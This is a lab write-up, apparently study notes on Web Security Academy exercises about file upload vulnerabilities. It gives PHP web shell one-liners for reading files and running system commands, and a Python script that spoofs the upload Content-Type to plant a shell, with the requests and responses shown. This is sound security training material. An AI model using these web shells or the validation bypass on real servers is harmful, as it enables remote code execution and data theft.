# File Upload Vulnerabilites

File upload vulnerabilites occur when a web server allows users to upload files to the filesystem of the server. If the server does not validate the file for malicious content, like checking file contents, name, type or size, this can be dangerous and potentially allow RCE. It can even be exploited as a DDoS attack uploading huge files relentlessly.

Sometimes the validation is not as robust as the developer thinks and can be bypassed due to parsing errors. Other occurences are seen with blacklists which are not exhaustive (Very hard for them to be).

A particular bad case of file upload vulns, is when an attacker is able to upload serverside scripts (PHP, JS, Java, Python). This can enable the attacker to create a web shell. A web shell is when an attacker is able to execute arbitrary code on the server using HTTP requests.

An example is the PHP one-liner: `<?php echo file_get_contents('/path/to/target/file'); ?>` This will enable the attacker to retrieve the contents on any file of the server. An even better web shell would be executing system commands, like bash commands: `<?php echo system($_GET['command']); ?>`. This would allow for parsing commands as a HTTP query param: `GET /example/exploit.php?command=ls`. As an example, combining both PHP one-liners, an attacker could create a file, save the output of the command to the file, and retrieve the output using the first script.

## Lab: Remote code execution via web shell upload

**Lab Description**:  This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem. To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner. You can log in to your own account using the following credentials: `wiener:peter`.

### Lab solution

It is apparent that the web shell described in the last section will be great for this purpose. Creating a php file with the single line: `<?php echo file_get_contents('/path/to/target/file'); ?>` will do the trick. It must be modified to get the file at location `/home/carlos/secret`. Therefore we will need to figure out where the files are saved to and upload our file.

Uploading a file results in the respone `The file avatars/webshell.php has been uploaded.` Using the default value `/home/carlos/secret` seems to actually work. A reqeust to the webserver, which fetchs the users avatar executes the uploaded file (webshell.php). It looks as follows:

```HTTP
https://0a1a00aa03f2172083a4750a00a900a5.web-security-academy.net/files/avatars/webshell.php

Response
OTNAo87z985TJ0HgrXbbAWJUqHcivxPj
```

Submitting this string solves the lab.

The payload looks as follows: `<?php echo file_get_contents('/home/carlos/secret');`

## Flawed File type validation

One thing to look for when assesing file upload functions, is the content of a `POST` request. For large files or binary data the content-type header should be set to `multipart/form-data`.

When sending a `POST` request with `multipart/form-data`, the structure will look like this:

```HTTP
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

The interesting thing to notice here, is the `Content-disposition` field, which is included in each part of the input. The message has a boundary which splits the form into individual parts. Large files may also be split. Therefore each boundary has a `Content-disposition` and may also include a `Content-Type` header. The disposition gives the server information about the data to come. Content type denotes a mime type. Some web applications only check this header for validation of input. As with many other headers, this can be spoofed.

## Lab: Web shell upload via Content-Type restriction bypass

**Lab Description**:   This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this. To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner. You can log in to your own account using the following credentials: `wiener:peter`

### Lab Solution

The challenge is very similar to the previous one. This time however, some validation is performed, and we need to find out which. A hint is the mime type validation done in the `Content-Type` header in `multipart/form-data`. We can log in and try to upload a file to verify how the validation is done. When uploading `webshell.php` the server responds with:

```HTTP
403 Forbidden
Sorry, file type application/x-php is not allowed
        Only image/jpeg and image/png are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Looking closer at the request:

```HTTP
-----------------------------21252443232957699354717010144
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret');
-----------------------------21252443232957699354717010144
Content-Disposition: form-data; name="user"

wiener
-----------------------------21252443232957699354717010144
Content-Disposition: form-data; name="csrf"

emfrefzPxxGo1zU8JwlwnCkzuDsANoCF
-----------------------------21252443232957699354717010144--
```

We see the content type header recognises the file correctly as PHP. We might be able to spoof this. This can be done either by using Burpsuite or writing a script. Of course, we are going to do a script. The script is written in python, and essentially just spoofs the `Content-Type` header in the multipart form:

```python
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

# response = requests.get("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account?id=wiener")
multipart_data = MultipartEncoder(fields={
    'avatar': ('webshell.php', "<?php echo file_get_contents('/home/carlos/secret');", "image/jpeg"),
    'csrf': "jceEZQqiBaO2Raue8Ma5HIsvJZjbErsk",
    'user': "wiener"
})

headers = {
    "Cookie": "session=ouPQveWk4Td9dZzD7a2AUYq1GGVLzgTE",
    'Content-Type': multipart_data.content_type
}

response = requests.post("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account/avatar", headers=headers, data=multipart_data)

print(response.text, " - ", response.status_code)
```

The script uses python requests and the MultipartEncoder tool provided by requests toolbelt. We need to include a session cookie and csrf token in the HTTP request. These are obtained from loggin in on the website and obtaining them in the network tab. When the script is run, the following response is received:

```html
The file avatars/webshell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>  -  200
```

This indicates that the upload was succesful. Reloading the account pages proves this, and our PHP script is run. In the network tab the secret can be obtained. Submitting the secret, solves the lab.
